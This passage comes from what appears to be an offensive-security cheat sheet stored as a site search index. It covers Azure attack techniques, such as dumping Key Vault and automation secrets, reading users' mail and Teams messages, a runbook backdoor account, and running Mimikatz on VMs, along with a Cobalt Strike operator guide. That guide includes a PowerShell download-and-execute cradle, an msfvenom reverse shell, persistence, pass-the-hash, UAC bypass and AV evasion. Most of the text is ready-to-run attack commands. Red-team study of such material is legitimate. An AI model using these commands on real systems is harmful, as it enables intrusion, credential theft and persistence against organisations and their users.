\"$IDENTITY_ENDPOINT?resource=https://vault.azure.net&amp;apiversion=2017-09-01\" -H secret:$IDENTITY_HEADER\ncurl \"$IDENTITY_ENDPOINT?resource=https://management.azure.com&amp;apiversion=2017-09-01\" -H secret:$IDENTITY_HEADER\n</code></pre></p> </li> <li> <p>Connect with the access token     <pre><code>PS&gt; $token = 'eyJ0..'\nPS&gt; $keyvaulttoken = 'eyJ0..'\nPS&gt; $accid = '2e...bc'\nPS Az&gt; Connect-AzAccount -AccessToken $token -AccountId $accid -KeyVaultAccessToken $keyvaulttoken\n</code></pre></p> </li> </ul>"},{"location":"cloud/azure/azure-services-keyvault/#query-secrets","title":"Query Secrets","text":"<ul> <li> <p>Query the vault and the secrets     <pre><code>PS Az&gt; Get-AzKeyVault\nPS Az&gt; Get-AzKeyVaultSecret -VaultName &lt;VaultName&gt;\nPS Az&gt; Get-AzKeyVaultSecret -VaultName &lt;VaultName&gt; -Name Reader -AsPlainText\n</code></pre></p> </li> <li> <p>Extract secrets from Automations, AppServices and KeyVaults     <pre><code>Import-Module Microburst.psm1\nPS Microburst&gt; Get-AzurePasswords\nPS Microburst&gt; Get-AzurePasswords -Verbose | Out-GridView\n</code></pre></p> </li> </ul>"},{"location":"cloud/azure/azure-services-keyvault/#references","title":"References","text":"<ul> <li>Get-AzurePasswords: A Tool for Dumping Credentials from Azure Subscriptions - August 28, 2018 - Karl Fosaaen</li> </ul>"},{"location":"cloud/azure/azure-services-microsoft-intune/","title":"Azure Services - Microsoft Intune","text":""},{"location":"cloud/azure/azure-services-microsoft-intune/#laps","title":"LAPS","text":"<pre><code>#requires -modules Microsoft.Graph.Authentication\n#requires -modules Microsoft.Graph.Intune\n#requires -modules LAPS\n#requires -modules ImportExcel\n\n$DaysBack = 30\nConnect-MgGraph\nGet-IntuneManagedDevice -Filter \"Platform eq 'Windows'\" |\n    Foreach-Object {Get-LapsAADPassword -DevicesIds $_.DisplayName} |\n        Where-Object {$_.PasswordExpirationTime -lt (Get-Date).AddDays(-$DaysBack)} |\n            Export-Excel -Path \"c:\\temp\\lapsdata.xlsx\" - ClearSheet -AutoSize -Show\n</code></pre>"},{"location":"cloud/azure/azure-services-microsoft-intune/#intunes-administration","title":"Intunes Administration","text":"<p>Requirements: * Global Administrator or Intune Administrator Privilege : <code>Get-AzureADGroup -Filter \"DisplayName eq 'Intune Administrators'\"</code></p> <ol> <li>Login into https://endpoint.microsoft.com/#home or use Pass-The-PRT</li> <li>Go to Devices -&gt; All Devices to check devices enrolled to Intune</li> <li>Go to Scripts and click on Add for Windows 10. </li> <li>Add a Powershell script</li> <li>Specify Add all users and Add all devices in the Assignments page.</li> </ol> <p> It will take up to one hour before you script is executed !</p>"},{"location":"cloud/azure/azure-services-microsoft-intune/#references","title":"References","text":"<ul> <li>Microsoft Intune - Microsoft Intune support for Windows LAPS</li> </ul>"},{"location":"cloud/azure/azure-services-office-365/","title":"Azure Services - Office 365","text":""},{"location":"cloud/azure/azure-services-office-365/#microsoft-teams-messages","title":"Microsoft Teams Messages","text":"<pre><code>TokenTacticsV2&gt; RefreshTo-MSTeamsToken -domain domain.local\nAADInternals&gt; Get-AADIntTeamsMessages -AccessToken $MSTeamsToken.access_token | Format-Table id,content,deletiontime,*type*,DisplayName\n</code></pre>"},{"location":"cloud/azure/azure-services-office-365/#outlook-mails","title":"Outlook Mails","text":"<ul> <li>Read user mails     <pre><code>Get-MgUserMessage -UserId &lt;user-id&gt; | ft\nGet-MgUserMessageContent -OutFile mail.txt -UserId &lt;user-id&gt; -MessageId &lt;message-id&gt;\n</code></pre></li> </ul>"},{"location":"cloud/azure/azure-services-office-365/#onedrive-files","title":"OneDrive Files","text":"<pre><code>$userId = \"&lt;user-id&gt;\"\nImport-Module Microsoft.Graph.Files\nGet-MgUserDefaultDrive -UserId $userId\nGet-MgUserDrive -UserId $UserId  -Debug\nGet-MgDrive -top 1\n</code></pre>"},{"location":"cloud/azure/azure-services-office-365/#references","title":"References","text":"<ul> <li>Pentesting Azure Mindmap - Alexis Danizan</li> </ul>"},{"location":"cloud/azure/azure-services-runbook/","title":"Azure Services - Runbook and Automation","text":""},{"location":"cloud/azure/azure-services-runbook/#runbook","title":"Runbook","text":"<p>Runbook must be SAVED and PUBLISHED before running it.</p>"},{"location":"cloud/azure/azure-services-runbook/#list-the-runbooks","title":"List the Runbooks","text":"<pre><code>Get-AzAutomationAccount | Get-AzAutomationRunbook\n</code></pre>"},{"location":"cloud/azure/azure-services-runbook/#create-a-runbook","title":"Create a Runbook","text":"<ul> <li>Check user right for automation     <pre><code>az extension add --upgrade -n automation\naz automation account list # if it doesn't return anything the user is not a part of an Automation group\naz ad signed-in-user list-owned-objects\n</code></pre></li> <li>Add the user to the \"Automation\" group: <code>Add-AzureADGroupMember -ObjectId &lt;OBJID&gt; -RefObjectId &lt;REFOBJID&gt; -Verbose</code></li> <li>Get the role of a user on the Automation account: <code>Get-AzRoleAssignment -Scope /subscriptions/&lt;ID&gt;/resourceGroups/&lt;RG-NAME&gt;/providers/Microsoft.Automation/automationAccounts/&lt;AUTOMATION-ACCOUNT&gt;</code>. NOTE: Contributor or higher privileges accounts can create and execute Runbooks</li> <li>List hybrid workers: <code>Get-AzAutomationHybridWorkerGroup -AutomationAccountName &lt;AUTOMATION-ACCOUNT&gt; -ResourceGroupName &lt;RG-NAME&gt;</code></li> <li>Create a Powershell Runbook: <code>Import-AzAutomationRunbook -Name &lt;RUNBOOK-NAME&gt; -Path C:\\Tools\\username.ps1 -AutomationAccountName &lt;AUTOMATION-ACCOUNT&gt; -ResourceGroupName &lt;RG-NAME&gt; -Type PowerShell -Force -Verbose</code></li> <li>Publish the Runbook: <code>Publish-AzAutomationRunbook -RunbookName &lt;RUNBOOK-NAME&gt; -AutomationAccountName &lt;AUTOMATION-ACCOUNT&gt; -ResourceGroupName &lt;RG-NAME&gt; -Verbose</code></li> <li>Start the Runbook: <code>Start-AzAutomationRunbook -RunbookName &lt;RUNBOOK-NAME&gt; -RunOn Workergroup1 -AutomationAccountName &lt;AUTOMATION-ACCOUNT&gt; -ResourceGroupName &lt;RG-NAME&gt; -Verbose</code></li> </ul>"},{"location":"cloud/azure/azure-services-runbook/#automation-account","title":"Automation Account","text":""},{"location":"cloud/azure/azure-services-runbook/#list-automation-accounts","title":"List Automation Accounts","text":"<p>Azure Automation provides a way to automate the repetitive tasks you perform in your Azure environment.</p> <pre><code>Get-AzAutomationAccount\n</code></pre>"},{"location":"cloud/azure/azure-services-runbook/#get-automation-credentials","title":"Get Automation Credentials","text":"<pre><code>Get-AzAutomationAccount | Get-AzAutomationCredential\nGet-AzAutomationAccount | Get-AzAutomationConnection\nGet-AzAutomationAccount | Get-AzAutomationCertificate\nGet-AzAutomationAccount | Get-AzAutomationVariable\n</code></pre>"},{"location":"cloud/azure/azure-services-runbook/#persistence-via-automation-accounts","title":"Persistence via Automation Accounts","text":"<ul> <li>Create a new Automation Account<ul> <li>\"Create Azure Run As account\": Yes</li> </ul> </li> <li>Import a new runbook that creates an AzureAD user with Owner permissions for the subscription*<ul> <li>Sample runbook https://github.com/NetSPI/MicroBurst</li> <li>Publish the runbook</li> <li>Add a webhook to the runbook</li> </ul> </li> <li>Add the AzureAD module to the Automation account<ul> <li>Update the Azure Automation Modules</li> </ul> </li> <li>Assign \"User Administrator\" and \"Subscription Owner\" rights to the automation account</li> <li> <p>Trigger the webhook with a post request to create the new user</p> <pre><code>$uri = \"https://s15events.azure-automation.net/webhooks?token=h6[REDACTED]%3d\"\n$AccountInfo  = @(@{RequestBody=@{Username=\"BackdoorUsername\";Password=\"BackdoorPassword\"}})\n$body = ConvertTo-Json -InputObject $AccountInfo\n$response = Invoke-WebRequest -Method Post -Uri $uri -Body $body\n</code></pre> </li> </ul>"},{"location":"cloud/azure/azure-services-runbook/#desired-state-configuration","title":"Desired State Configuration","text":""},{"location":"cloud/azure/azure-services-runbook/#list-the-dsc","title":"List the DSC","text":"<pre><code>Get-AzAutomationAccount | Get-AzAutomationDscConfiguration\n</code></pre>"},{"location":"cloud/azure/azure-services-runbook/#export-the-configuration","title":"Export the configuration","text":"<pre><code>$DSCName = ${dscToExport}\nGet-AzAutomationAccount | Get-AzAutomationDscConfiguration | where {$_.name -march $DSCName} | Export-AzAutomationDscConfiguration -OutputFolder (get-location) -Debug\n</code></pre>"},{"location":"cloud/azure/azure-services-runbook/#references","title":"References","text":""},{"location":"cloud/azure/azure-services-storage-blob/","title":"Azure Services - Storage Blob","text":"<ul> <li>Blobs - <code>*.blob.core.windows.net</code></li> <li>File Services - <code>*.file.core.windows.net</code></li> <li>Data Tables - <code>*.table.core.windows.net</code></li> <li>Queues - <code>*.queue.core.windows.net</code></li> </ul>"},{"location":"cloud/azure/azure-services-storage-blob/#enumerate-blobs","title":"Enumerate blobs","text":"<pre><code>PS &gt; . C:\\Tools\\MicroBurst\\Misc\\InvokeEnumerateAzureBlobs.ps1\nPS &gt; Invoke-EnumerateAzureBlobs -Base &lt;SHORT DOMAIN&gt; -OutputFile azureblobs.txt\nFound Storage Account -  redacted.blob.core.windows.net\n</code></pre>"},{"location":"cloud/azure/azure-services-storage-blob/#list-and-download-blobs","title":"List and download blobs","text":"<pre><code>PS Az&gt; Get-AzResource\nPS Az&gt; Get-AzStorageAccount -name &lt;NAME&gt; -ResourceGroupName &lt;NAME&gt;\nPS Az&gt; Get-AzStorageContainer -Context (Get-AzStorageAccount -name &lt;NAME&gt; -ResourceGroupName &lt;NAME&gt;).context\nPS Az&gt; Get-AzStorageBlobContent -Container &lt;NAME&gt; -Context (Get-AzStorageAccount -name &lt;NAME&gt; -ResourceGroupName &lt;NAME&gt;).context -Blob\n</code></pre> <p>Retrieve exposed containers with public access</p> <pre><code>PS Az&gt; (Get-AzStorageAccount | Get-AzStorageContainer).cloudBlobContainer | select Uri,@{n='PublicAccess';e={$_.Properties.PublicAccess}}\n</code></pre>"},{"location":"cloud/azure/azure-services-storage-blob/#sas-url","title":"SAS URL","text":"<ul> <li>Use Storage Explorer</li> <li>Click on Open Connect Dialog in the left menu. </li> <li>Select Blob container. </li> <li>On the Select Authentication Method page<ul> <li>Select Shared access signature (SAS) and click on Next</li> <li>Copy the URL in Blob container SAS URL field.</li> </ul> </li> </ul> <p> You can also use <code>subscription</code>(username/password) to access storage resources such as blobs and files.</p>"},{"location":"cloud/azure/azure-services-storage-blob/#references","title":"References","text":""},{"location":"cloud/azure/azure-services-virtual-machine/","title":"Azure Services - Virtual Machine","text":""},{"location":"cloud/azure/azure-services-virtual-machine/#runcommand","title":"RunCommand","text":"<p>Allow anyone with \"Contributor\" rights to run PowerShell scripts on any Azure VM in a subscription as <code>NT Authority\\System</code></p> <p>Requirements: <code>Microsoft.Compute/virtualMachines/runCommand/action</code></p> <ul> <li> <p>List available Virtual Machines     <pre><code>PS C:\\&gt; Get-AzureRmVM -status | where {$_.PowerState -EQ \"VM running\"} | select ResourceGroupName,Name\nResourceGroupName    Name       \n-----------------    ----       \nTESTRESOURCES        Remote-Test\n</code></pre></p> </li> <li> <p>Get Public IP of VM by querying the network interface     <pre><code>PS AzureAD&gt; Get-AzVM -Name &lt;RESOURCE&gt; -ResourceGroupName &lt;RG-NAME&gt; | select -ExpandProperty NetworkProfile\nPS AzureAD&gt; Get-AzNetworkInterface -Name &lt;RESOURCE368&gt;\nPS AzureAD&gt; Get-AzPublicIpAddress -Name &lt;RESOURCEIP&gt;\n</code></pre></p> </li> <li> <p>Execute Powershell script on the VM, like <code>adduser</code> <pre><code>PS AzureAD&gt; Invoke-AzVMRunCommand -VMName &lt;RESOURCE&gt; -ResourceGroupName &lt;RG-NAME&gt; -CommandId 'RunPowerShellScript' -ScriptPath 'C:\\Tools\\adduser.ps1' -Verbose\nPS Azure C:\\&gt; Invoke-AzureRmVMRunCommand -ResourceGroupName TESTRESOURCES -VMName Remote-Test -CommandId RunPowerShellScript -ScriptPath Mimikatz.ps1\n</code></pre></p> </li> <li> <p>Finally you should be able to connect via WinRM     <pre><code>$password = ConvertTo-SecureString '&lt;PASSWORD&gt;' -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential('username', $Password)\n$sess = New-PSSession -ComputerName &lt;IP&gt; -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)\nEnter-PSSession $sess\n</code></pre></p> </li> </ul> <p>Against the whole subscription using <code>MicroBurst.ps1</code></p> <pre><code>Import-module MicroBurst.psm1\nInvoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt\n</code></pre>"},{"location":"cloud/azure/azure-services-virtual-machine/#references","title":"References","text":"<ul> <li>Running Powershell scripts on Azure VM - Karl Fosaaen - November 6, 2018</li> </ul>"},{"location":"cloud/azure/azure-services-web-apps/","title":"Azure Services - Web Apps","text":""},{"location":"cloud/azure/azure-services-web-apps/#list-web-app","title":"List Web App","text":"<pre><code>az webapp list\n</code></pre>"},{"location":"cloud/azure/azure-services-web-apps/#execute-commands","title":"Execute Commands","text":"<pre><code>$ARMToken = Get-ARMTokenWithRefreshToken `\n    -RefreshToken \"0.ARwA6WgJJ9X2qk...\" `\n    -TenantID \"contoso.onmicrosoft.com\"\n\nInvoke-AzureRMWebAppShellCommand `\n    -KuduURI \"https://&lt;webapp&gt;.scm.azurewebsites.net/api/command\" `\n    -Token $ARMToken `\n    -Command \"whoami\"\n</code></pre>"},{"location":"cloud/azure/azure-services-web-apps/#ssh-connection","title":"SSH Connection","text":"<p>First check if the SSH over HTTP connection is enabled: <code>(curl https://${appName}?app.scm.azurewebsites.net/webssh/host).statuscode</code></p> <pre><code>az webapp create-remote-connection --subscription &lt;SUBSCRIPTION-ID&gt; --resource-group &lt;RG-NAME&gt; -n &lt;APP-SERVICE-NAME&gt;\n</code></pre>"},{"location":"cloud/azure/azure-services-web-apps/#references","title":"References","text":""},{"location":"command-control/cobalt-strike/","title":"Cobalt Strike","text":"<p>Cobalt Strike is threat emulation software. Red teams and penetration testers use Cobalt Strike to demonstrate the risk of a breach and evaluate mature security programs. Cobalt Strike exploits network vulnerabilities, launches spear phishing campaigns, hosts web drive-by attacks, and generates malware infected files from a powerful graphical user interface that encourages collaboration and reports all activity.</p> <pre><code>$ sudo apt-get update\n$ sudo apt-get install openjdk-11-jdk\n$ sudo apt install proxychains socat\n$ sudo update-java-alternatives -s java-1.11.0-openjdk-amd64\n$ sudo ./teamserver 10.10.10.10 \"password\" [malleable C2 profile]\n$ ./cobaltstrike\n$ powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://campaigns.example.com/download/dnsback'))\" \n</code></pre>"},{"location":"command-control/cobalt-strike/#summary","title":"Summary","text":"<ul> <li>Infrastructure<ul> <li>Redirectors</li> <li>Domain fronting</li> </ul> </li> <li>OpSec<ul> <li>Customer ID</li> </ul> </li> <li>Payloads<ul> <li>DNS Beacon</li> <li>SMB Beacon</li> <li>Metasploit compatibility</li> <li>Custom Payloads</li> </ul> </li> <li>Malleable C2</li> <li>Files</li> <li>Powershell and .NET<ul> <li>Powershell commabds</li> <li>.NET remote execution</li> </ul> </li> <li>Lateral Movement</li> <li>VPN &amp; Pivots</li> <li>Kits<ul> <li>Elevate Kit</li> <li>Persistence Kit</li> <li>Resource Kit</li> <li>Artifact Kit</li> <li>Mimikatz Kit</li> <li>Sleep Mask Kit</li> <li>Thread Stack Spoofer</li> </ul> </li> <li>Beacon Object Files</li> <li>NTLM Relaying via Cobalt Strike</li> <li>References</li> </ul>"},{"location":"command-control/cobalt-strike/#infrastructure","title":"Infrastructure","text":""},{"location":"command-control/cobalt-strike/#redirectors","title":"Redirectors","text":"<pre><code>sudo apt install socat\nsocat TCP4-LISTEN:80,fork TCP4:[TEAM SERVER]:80\n</code></pre>"},{"location":"command-control/cobalt-strike/#domain-fronting","title":"Domain Fronting","text":"<ul> <li>New Listener &gt; HTTP Host Header</li> <li>Choose a domain in \"Finance &amp; Healthcare\" sector </li> </ul>"},{"location":"command-control/cobalt-strike/#opsec","title":"OpSec","text":"<p>Don't * Use default self-signed HTTPS certificate * Use default port (50050) * Use 0.0.0.0 DNS response * Metasploit compatibility, ask for a payload : <code>wget -U \"Internet Explorer\" http://127.0.0.1/vl6D</code></p> <p>Do * Use a redirector (Apache, CDN, ...) * Firewall to only accept HTTP/S from the redirectors * Firewall 50050 and access via SSH tunnel * Edit default HTTP 404 page and Content type: text/plain * No staging <code>set hosts_stage</code> to <code>false</code> in Malleable C2 * Use Malleable Profile to taylor your attack to specific actors</p>"},{"location":"command-control/cobalt-strike/#customer-id","title":"Customer ID","text":"<p>The Customer ID is a 4-byte number associated with a Cobalt Strike license key. Cobalt Strike 3.9 and later embed this information into the payload stagers and stages generated by Cobalt Strike.</p> <ul> <li>The Customer ID value is the last 4-bytes of a Cobalt Strike payload stager in Cobalt Strike 3.9 and later.</li> <li>The trial has a Customer ID value of 0. </li> <li>Cobalt Strike does not use the Customer ID value in its network traffic or other parts of the tool</li> </ul>"},{"location":"command-control/cobalt-strike/#payloads","title":"Payloads","text":""},{"location":"command-control/cobalt-strike/#dns-beacon","title":"DNS Beacon","text":"<ul> <li>Edit the Zone File for the domain</li> <li>Create an A record for Cobalt Strike system</li> <li>Create an NS record that points to FQDN of your Cobalt Strike system</li> </ul> <p>Your Cobalt Strike team server system must be authoritative for the domains you specify. Create a DNS A record and point it to your Cobalt Strike team server. Use DNS NS records to delegate several domains or sub-domains to your Cobalt Strike team server's A record.</p> <ul> <li>nslookup jibberish.beacon polling.campaigns.domain.com</li> <li>nslookup jibberish.beacon campaigns.domain.com</li> </ul> <p>Example of DNS on Digital Ocean:</p> <pre><code>NS  example.com                     directs to 10.10.10.10.            86400\nNS  polling.campaigns.example.com   directs to campaigns.example.com.   3600\nA   campaigns.example.com           directs to 10.10.10.10              3600 \n</code></pre> <pre><code>systemctl disable systemd-resolved\nsystemctl stop systemd-resolved\nrm /etc/resolv.conf\necho \"nameserver 8.8.8.8\" &gt;  /etc/resolv.conf\necho \"nameserver 8.8.4.4\" &gt;&gt;  /etc/resolv.conf\n</code></pre> <p>Configuration: 1. host: campaigns.domain.com 2. beacon: polling.campaigns.domain.com 3. Interact with a beacon, and <code>sleep 0</code></p>"},{"location":"command-control/cobalt-strike/#smb-beacon","title":"SMB Beacon","text":"<pre><code>link [host] [pipename]\nconnect [host] [port]\nunlink [host] [PID]\njump [exec] [host] [pipe]\n</code></pre> <p>SMB Beacon uses Named Pipes. You might encounter these error code while running it.</p> Error Code Meaning Description 2 File Not Found There is no beacon for you to link to 5 Access is denied Invalid credentials or you don't have permission 53 Bad Netpath You have no trust relationship with the target system. It may or may not be a beacon there."},{"location":"command-control/cobalt-strike/#ssh-beacon","title":"SSH Beacon","text":"<pre><code># deploy a beacon\nbeacon&gt; help ssh\nUse: ssh [target:port] [user] [pass]\nSpawn an SSH client and attempt to login to the specified target\n\nbeacon&gt; help ssh-key\nUse: ssh [target:port] [user] [/path/to/key.pem]\nSpawn an SSH client and attempt to login to the specified target\n\n# beacon's commands\nupload                    Upload a file\ndownload                  Download a file\nsocks                     Start SOCKS4a server to relay traffic\nsudo                      Run a command via sudo\nrportfwd                  Setup a reverse port forward\nshell                     Execute a command via the shell\n</code></pre>"},{"location":"command-control/cobalt-strike/#metasploit-compatibility","title":"Metasploit compatibility","text":"<ul> <li>Payload: windows/meterpreter/reverse_http or windows/meterpreter/reverse_https</li> <li>Set LHOST and LPORT to the beacon</li> <li>Set DisablePayloadHandler to True</li> <li>Set PrependMigrate to True</li> <li>exploit -j</li> </ul>"},{"location":"command-control/cobalt-strike/#custom-payloads","title":"Custom Payloads","text":"<p>https://ired.team/offensive-security/code-execution/using-msbuild-to-execute-shellcode-in-c</p> <pre><code>* Attacks &gt; Packages &gt; Payload Generator \n* Attacks &gt; Packages &gt; Scripted Web Delivery (S)\n$ python2 ./shellcode_encoder.py -cpp -cs -py payload.bin MySecretPassword xor\n$ C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe C:\\Windows\\Temp\\dns_raw_stageless_x64.xml\n$ %windir%\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe \\\\10.10.10.10\\Shared\\dns_raw_stageless_x86.xml\n</code></pre>"},{"location":"command-control/cobalt-strike/#malleable-c2","title":"Malleable C2","text":"<p>List of Malleable Profiles hosted on Github * Cobalt Strike - Malleable C2 Profiles https://github.com/xx0hcd/Malleable-C2-Profiles * Cobalt Strike Malleable C2 Design and Reference Guide https://github.com/threatexpress/malleable-c2 * Malleable-C2-Profiles https://github.com/rsmudge/Malleable-C2-Profiles * SourcePoint is a C2 profile generator https://github.com/Tylous/SourcePoint</p> <p>Example of syntax</p> <pre><code>set useragent \"SOME AGENT\"; # GOOD\nset useragent 'SOME AGENT'; # BAD\nprepend \"This is an example;\";\n\n# Escape Double quotes\nappend \"here is \\\"some\\\" stuff\";\n# Escape Backslashes\nappend \"more \\\\ stuff\";\n# Some special characters do not need escaping\nprepend \"!@#$%^&amp;*()\";\n</code></pre> <p>Check a profile with <code>./c2lint</code>. * A result of 0 is returned if c2lint completes with no errors * A result of 1 is returned if c2lint completes with only warnings * A result of 2 is returned if c2lint completes with only errors * A result of 3 is returned if c2lint completes with both errors and warning</p>"},{"location":"command-control/cobalt-strike/#files","title":"Files","text":"<pre><code># List the file on the specified directory\nbeacon &gt; ls &lt;C:\\Path&gt;\n\n# Change into the specified working directory\nbeacon &gt; cd [directory]\n\n# Delete a file\\folder\nbeacon &gt; rm [file\\folder]\n\n# File copy\nbeacon &gt; cp [src] [dest]\n\n# Download a file from the path on the Beacon host\nbeacon &gt; download [C:\\filePath]\n\n# Lists downloads in progress\nbeacon &gt; downloads\n\n# Cancel a download currently in progress\nbeacon &gt; cancel [*file*]\n\n# Upload a file from the attacker to the current Beacon host\nbeacon &gt; upload [/path/to/file]\n</code></pre>"},{"location":"command-control/cobalt-strike/#powershell-and-net","title":"Powershell and .NET","text":""},{"location":"command-control/cobalt-strike/#powershell-commands","title":"Powershell commands","text":"<pre><code># Import a Powershell .ps1 script from the control server and save it in memory in Beacon\nbeacon &gt; powershell-import [/path/to/script.ps1]\n\n# Setup a local TCP server bound to localhost and download the script imported from above using powershell.exe. Then the specified function and any arguments are executed and output is returned.\nbeacon &gt; powershell [commandlet][arguments]\n\n# Launch the given function using Unmanaged Powershell, which does not start powershell.exe. The program used is set by spawnto\nbeacon &gt; powerpick [commandlet] [argument]\n\n# Inject Unmanaged Powershell into a specific process and execute the specified command. This is useful for long-running Powershell jobs\nbeacon &gt; psinject [pid][arch] [commandlet] [arguments]\n</code></pre>"},{"location":"command-control/cobalt-strike/#net-remote-execution","title":".NET remote execution","text":"<p>Run a local .NET executable as a Beacon post-exploitation job. </p> <p>Require: * Binaries compiled with the \"Any CPU\" configuration.</p> <pre><code>beacon &gt; execute-assembly [/path/to/script.exe] [arguments]\nbeacon &gt; execute-assembly /home/audit/Rubeus.exe\n[*] Tasked beacon to run .NET program: Rubeus.exe\n[+] host called home, sent: 318507 bytes\n[+] received output:\n\n   ______        _                      \n  (_____ \\      | |                     \n   _____) )_   _| |__  _____ _   _  ___ \n  |  __  /| | | |  _ \\| ___ | | | |/___)\n  | |  \\ \\| |_| | |_) ) ____| |_| |___ |\n  |_|   |_|____/|____/|_____)____/(___/\n\n  v1.4.2 \n</code></pre>"},{"location":"command-control/cobalt-strike/#lateral-movement","title":"Lateral Movement","text":"<p> OPSEC Advice: Use the spawnto command to change the process Beacon will launch for its post-exploitation jobs. The default is rundll32.exe </p> <ul> <li>portscan: Performs a portscan on a specific target.</li> <li>runas: A wrapper of runas.exe, using credentials you can run a command as another user.</li> <li>pth: By providing a username and a NTLM hash you can perform a Pass The Hash attack and inject a TGT on the current process. \\  This module needs Administrator privileges.</li> <li>steal_token: Steal a token from a specified process.</li> <li>make_token: By providing credentials you can create an impersonation token into the current process and execute commands from the context of the impersonated user.</li> <li>jump: Provides easy and quick way to move lateraly using winrm or psexec to spawn a new beacon session on a target. \\  The jump module will use the current delegation/impersonation token to authenticate on the remote target. \\  We can combine the jump module with the make_token or pth module for a quick \"jump\" to another target on the network.</li> <li>remote-exec: Execute a command on a remote target using psexec, winrm or wmi. \\  The remote-exec module will use the current delegation/impersonation token to authenticate on the remote target.</li> <li>ssh/ssh-key: Authenticate using ssh with password or private key. Works for both linux and windows hosts.</li> </ul> <p> All the commands launch powershell.exe</p> <pre><code>Beacon Remote Exploits\n======================\njump [module] [target] [listener] \n\n    psexec  x86 Use a service to run a Service EXE artifact\n    psexec64    x64 Use a service to run a Service EXE artifact\n    psexec_psh  x86 Use a service to run a PowerShell one-liner\n    winrm   x86 Run a PowerShell script via WinRM\n    winrm64 x64 Run a PowerShell script via WinRM\n\nBeacon Remote Execute Methods\n=============================\nremote-exec [module] [target] [command] \n\n    Methods                         Description\n    -------                         -----------\n    psexec                          Remote execute via Service Control Manager\n    winrm                           Remote execute via WinRM (PowerShell)\n    wmi                             Remote execute via WMI (PowerShell)\n</code></pre> <p>Opsec safe Pass-the-Hash: 1. <code>mimikatz sekurlsa::pth /user:xxx /domain:xxx /ntlm:xxxx /run:\"powershell -w hidden\"</code> 2. <code>steal_token PID</code></p>"},{"location":"command-control/cobalt-strike/#assume-control-of-artifact","title":"Assume Control of Artifact","text":"<ul> <li>Use <code>link</code> to connect to SMB Beacon</li> <li>Use <code>connect</code> to connect to TCP Beacon</li> </ul>"},{"location":"command-control/cobalt-strike/#vpn-pivots","title":"VPN &amp; Pivots","text":"<p> Covert VPN doesn't work with W10, and requires Administrator access to deploy.</p> <p>Use socks 8080 to setup a SOCKS4a proxy server on port 8080 (or any other port you choose). This will setup a SOCKS proxy server to tunnel traffic through Beacon. Beacon's sleep time adds latency to any traffic you tunnel through it. Use sleep 0 to make Beacon check-in several times a second.</p> <pre><code># Start a SOCKS server on the given port on your teamserver, tunneling traffic through the specified Beacon. Set the teamserver/port configuration in /etc/proxychains.conf for easy usage.\nbeacon &gt; socks [PORT]\nbeacon &gt; socks [port]\nbeacon &gt; socks [port] [socks4]\nbeacon &gt; socks [port] [socks5]\nbeacon &gt; socks [port] [socks5] [enableNoAuth|disableNoAuth] [user] [password]\nbeacon &gt; socks [port] [socks5] [enableNoAuth|disableNoAuth] [user] [password] [enableLogging|disableLogging]\n\n# Proxy browser traffic through a specified Internet Explorer process.\nbeacon &gt; browserpivot [pid] [x86|x64]\n\n# Bind to the specified port on the Beacon host, and forward any incoming connections to the forwarded host and port.\nbeacon &gt; rportfwd [bind port] [forward host] [forward port]\n\n# spunnel : Spawn an agent and create a reverse port forward tunnel to its controller.    ~=  rportfwd + shspawn.\nmsfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw -o /tmp/msf.bin\nbeacon&gt; spunnel x64 184.105.181.155 4444 C:\\Payloads\\msf.bin\n\n# spunnel_local: Spawn an agent and create a reverse port forward, tunnelled through your Cobalt Strike client, to its controller\n# then you can handle the connect back on your MSF multi handler\nbeacon&gt; spunnel_local x64 127.0.0.1 4444 C:\\Payloads\\msf.bin\n</code></pre>"},{"location":"command-control/cobalt-strike/#kits","title":"Kits","text":"<ul> <li>Cobalt Strike Community Kit - Community Kit is a central repository of extensions written by the user community to extend the capabilities of Cobalt Strike</li> </ul>"},{"location":"command-control/cobalt-strike/#elevate-kit","title":"Elevate Kit","text":"<p>UAC Token Duplication : Fixed in Windows 10 Red Stone 5 (October 2018)</p> <pre><code>beacon&gt; runasadmin\n\nBeacon Command Elevators\n========================\n\n    Exploit                         Description\n    -------                         -----------\n    ms14-058                        TrackPopupMenu Win32k NULL Pointer Dereference (CVE-2014-4113)\n    ms15-051                        Windows ClientCopyImage Win32k Exploit (CVE 2015-1701)\n    ms16-016                        mrxdav.sys WebDav Local Privilege Escalation (CVE 2016-0051)\n    svc-exe                         Get SYSTEM via an executable run as a service\n    uac-schtasks                    Bypass UAC with schtasks.exe (via SilentCleanup)\n    uac-token-duplication           Bypass UAC with Token Duplication\n</code></pre>"},{"location":"command-control/cobalt-strike/#persistence-kit","title":"Persistence Kit","text":"<ul> <li>https://github.com/0xthirteen/MoveKit</li> <li>https://github.com/fireeye/SharPersist     <pre><code># List persistences\nSharPersist -t schtaskbackdoor -m list\nSharPersist -t startupfolder -m list\nSharPersist -t schtask -m list\n\n# Add a persistence\nSharPersist -t schtaskbackdoor -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -n \"Something Cool\" -m add\nSharPersist -t schtaskbackdoor -n \"Something Cool\" -m remove\n\nSharPersist -t service -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -n \"Some Service\" -m add\nSharPersist -t service -n \"Some Service\" -m remove\n\nSharPersist -t schtask -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -n \"Some Task\" -m add\nSharPersist -t schtask -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -n \"Some Task\" -m add -o hourly\nSharPersist -t schtask -n \"Some Task\" -m remove\n</code></pre></li> </ul>"},{"location":"command-control/cobalt-strike/#resource-kit","title":"Resource Kit","text":"<p>The Resource Kit is Cobalt Strike's means to change the HTA, PowerShell, Python, VBA, and VBS script templates Cobalt Strike uses in its workflows</p>"},{"location":"command-control/cobalt-strike/#artifact-kit","title":"Artifact Kit","text":"<p>Cobalt Strike uses the Artifact Kit to generate its executables and DLLs. The Artifact Kit is a source code framework to build executables and DLLs that evade some anti-virus products. The Artifact Kit build script creates a folder with template artifacts for each Artifact Kit technique. To use a technique with Cobalt Strike, go to Cobalt Strike -&gt; Script Manager, and load the artifact.cna script from that technique's folder.</p> <p>Artifact Kit (Cobalt Strike 